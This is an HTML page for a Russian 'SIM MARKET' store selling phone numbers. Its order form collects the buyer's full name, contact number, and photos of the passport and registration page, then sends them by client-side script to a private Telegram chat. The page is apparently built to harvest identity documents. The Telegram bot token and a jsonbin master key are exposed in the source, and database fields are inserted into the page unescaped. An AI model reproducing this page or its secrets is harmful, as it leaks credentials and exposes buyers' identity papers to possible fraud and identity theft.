<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SIM MARKET | LUXURY</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap');
        
        body { background: #050505; color: #fff; font-family: 'Manrope', sans-serif; margin: 0; }

        /* ЛОГОТИП */
        .logo-shine {
            font-weight: 800; font-size: 28px; letter-spacing: -1px; text-transform: uppercase;
            background: linear-gradient(90deg, #bf953f, #fcf6ba, #b38728, #fcf6ba, #bf953f);
            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: shine 3s linear infinite; font-style: italic;
        }
        @keyframes shine { to { background-position: 200% center; } }

        /* КАРТОЧКА НОМЕРА */
        .glass-card {
            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08);
            border-radius: 28px; padding: 24px; transition: 0.3s;
        }

        /* КНОПКА ЗАКАЗАТЬ */
        .buy-btn {
            background: #fff; color: #000; font-weight: 800; font-size: 10px;
            text-transform: uppercase; letter-spacing: 1px; padding: 14px;
            border-radius: 14px; transition: 0.3s; border: none; cursor: pointer; width: 100%;
        }
        .buy-btn:active { transform: scale(0.96); background: #fbbf24; }

        /* ФИЛЬТРЫ */
        .tab-btn {
            background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05);
            padding: 12px 20px; border-radius: 14px; font-size: 11px; font-weight: 800;
            text-transform: uppercase; color: #71717a; transition: 0.3s; cursor: pointer;
        }
        .tab-active { background: #fff !important; color: #000 !important; }

        /* ИНПУТЫ */
        .input-luxury {
            background: #0f0f0f; border: 1px solid #1a1a1a; border-radius: 18px;
            padding: 18px; width: 100%; color: #fff; outline: none; text-align: center;
        }
        .btn-submit {
            background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%);
            color: #000; font-weight: 800; border-radius: 18px; width: 100%; padding: 20px;
            text-transform: uppercase; letter-spacing: 2px; font-size: 11px; border: none;
        }

        #order-modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.97); backdrop-filter: blur(15px); align-items: center; justify-content: center; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>

    <header class="flex flex-col items-center py-10 border-b border-white/5">
        <h1 class="logo-shine">SIM MARKET</h1>
        <p class="text-[9px] font-bold opacity-30 tracking-[4px] mt-2 uppercase">Premium Store</p>
    </header>

    <main class="max-w-xl mx-auto p-6">
        <input type="text" id="q" oninput="draw()" placeholder="Поиск по цифрам..." class="input-luxury mb-8">

        <div class="flex gap-2 overflow-x-auto no-scrollbar mb-10 pb-2">
            <button onclick="setFilter('all', this)" class="tab-btn tab-active">Все</button>
            <button onclick="setFilter('mts', this)" class="tab-btn">МТС</button>
            <button onclick="setFilter('megafon', this)" class="tab-btn">Мегафон</button>
            <button onclick="setFilter('beeline', this)" class="tab-btn">Билайн</button>
            <button onclick="setFilter('yota', this)" class="tab-btn">Yota</button>
            <button onclick="setFilter('tele2', this)" class="tab-btn">Tele2</button>
        </div>

        <div id="list" class="space-y-6"></div>
    </main>

    <div id="order-modal">
        <div class="glass-card w-[90%] max-w-md relative border-white/10">
            <button onclick="closeModal()" class="absolute top-5 right-5 text-zinc-500 text-xl">✕</button>
            <h3 class="text-[10px] font-bold text-amber-500 uppercase tracking-widest text-center mb-6">Оформление заказа</h3>
            <p id="selected-num" class="text-3xl font-black text-center mb-8 italic tracking-tighter"></p>

            <form id="tg-form" class="space-y-4">
                <input type="text" id="fio" placeholder="Ваше полное ФИО" class="input-luxury text-sm" required>
                <input type="tel" id="contact" placeholder="Номер для связи" class="input-luxury text-sm" required>
                
                <label class="flex flex-col items-center p-5 border-2 border-dashed border-white/10 rounded-2xl bg-white/5 cursor-pointer">
                    <span class="text-[11px] font-black uppercase text-amber-500">Выбрать фото паспорта</span>
                    <span id="p1-info" class="text-[8px] opacity-40 mt-1 uppercase">Лицевая сторона</span>
                    <input type="file" id="p1" class="hidden" accept="image/*" required onchange="showStatus('p1', 'p1-info')">
                </label>

                <label class="flex flex-col items-center p-5 border-2 border-dashed border-white/10 rounded-2xl bg-white/5 cursor-pointer">
                    <span class="text-[11px] font-black uppercase text-amber-500">Выбрать фото прописки</span>
                    <span id="p2-info" class="text-[8px] opacity-40 mt-1 uppercase">Страница с адресом</span>
                    <input type="file" id="p2" class="hidden" accept="image/*" required onchange="showStatus('p2', 'p2-info')">
                </label>

                <button type="submit" id="sub-btn" class="btn-submit mt-4">Отправить Курбану</button>
            </form>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8666944440:AAFAmQuYaYmnJjhuQ9AmdBQim9V-kxNnxAo';
        const CHAT_ID = '8768514374';
        const BIN_ID = '69c9d640aaba882197a65742';
        const MASTER_KEY = '$2a$10$BIVZfOXmYVaG9NpPRW61Le//5yePRuieGl/ph3o6UYlHw4uOJQKtW';

        let database = [], currentFilter = 'all';

        async function init() {
            try {
                const r = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: {'X-Master-Key': MASTER_KEY} });
                const d = await r.json();
                database = d.record.record || d.record || [];
                draw();
            } catch(e) { console.error('Ошибка базы'); }
        }

        function setFilter(val, el) {
            currentFilter = val.toLowerCase();
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
            el.classList.add('tab-active');
            draw();
        }

        function draw() {
            const list = document.getElementById('list');
            const q = document.getElementById('q').value;
            const filtered = database.filter(i => (i.n.includes(q)) && (currentFilter === 'all' || i.op.toLowerCase() === currentFilter));

            list.innerHTML = filtered.map(i => `
                <div class="glass-card flex flex-col items-center text-center gap-4">
                    <div>
                        <div class="text-[10px] font-bold uppercase opacity-40 mb-1 tracking-widest">${i.op}</div>
                        <div class="text-3xl font-black italic tracking-tighter mb-1">${i.n}</div>
                        <div class="text-xl font-bold text-amber-500">${i.t} ₽</div>
                    </div>
                    <button onclick="openModal('${i.n}')" class="buy-btn">Заказать</button>
                </div>
            `).reverse().join('');
        }

        function showStatus(id, infoId) {
            const span = document.getElementById(infoId);
            span.innerText = "ФОТО ВЫБРАНО ✅";
            span.style.color = "#10b981";
        }

        function openModal(n) {
            document.getElementById('selected-num').innerText = n;
            document.getElementById('order-modal').style.display = 'flex';
        }

        function closeModal() { document.getElementById('order-modal').style.display = 'none'; }

        document.getElementById('tg-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('sub-btn');
            btn.innerText = "ОТПРАВКА..."; btn.disabled = true;

            const msg = `🆕 <b>ЗАКАЗ</b>\n\n🔟 <b>НОМЕР:</b> <code>${document.getElementById('selected-num').innerText}</code>\n👤 <b>ФИО:</b> ${document.getElementById('fio').value}\n📞 <b>СВЯЗЬ:</b> ${document.getElementById('contact').value}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
                });

                const sendPhoto = async (id, caption) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', document.getElementById(id).files[0]);
                    fd.append('caption', caption);
                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                };

                await sendPhoto('p1', 'Паспорт: ' + document.getElementById('selected-num').innerText);
                await sendPhoto('p2', 'Прописка: ' + document.getElementById('selected-num').innerText);

                alert('✅ Отправлено!');
                closeModal();
            } catch(e) { alert('Ошибка'); } finally { btn.innerText = "Отправить Курбану"; btn.disabled = false; }
        };

        init();
    </script>
</body>
</html>
